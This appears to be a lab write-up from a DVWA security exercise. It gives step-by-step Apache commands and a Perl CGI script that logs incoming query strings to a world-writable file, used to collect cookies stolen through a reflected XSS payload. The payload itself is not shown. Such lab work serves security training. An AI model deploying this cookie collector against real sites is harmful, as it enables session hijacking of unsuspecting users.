PROCESS AND COMMANDS USED

Step 1: Start Apache Server
service apache2 start

Step 2: Enable CGI Module
a2enmod cgi
systemctl restart apache2

Step 3: Create Logs Directory
mkdir -p /var/www/logs
touch /var/www/logs/logs.txt

Step 4: Set Proper Permissions
chown -R www-data:www-data /var/www/logs
chmod 777 /var/www/logs/logs.txt

Step 5: Create CGI Script
Location: /usr/lib/cgi-bin/logs.pl



CGI Script Content:
#!/usr/bin/perl
use CGI;

my $q = CGI->new;
my $data = $q->query_string();

open(my $fh, '>>', '/var/www/logs/logs.txt');
print $fh "$data\n";
close($fh);

print "Content-type: text/html\n\n";
print "Logged";



Step 6: Give Execute Permission to CGI Script
chmod +x /usr/lib/cgi-bin/logs.pl
chown www-data:www-data /usr/lib/cgi-bin/logs.pl

Step 7: Verify CGI Script
Open in browser:
http://192.168.57.158/cgi-bin/logs.pl?test=ok

Step 8: Execute XSS Payload in DVWA
Payload injected in XSS (Reflected) input field and submitted.

Step 9: Verify Captured Cookies
cat /var/www/logs/logs.txt

Cookies successfully captured in logs.txt file.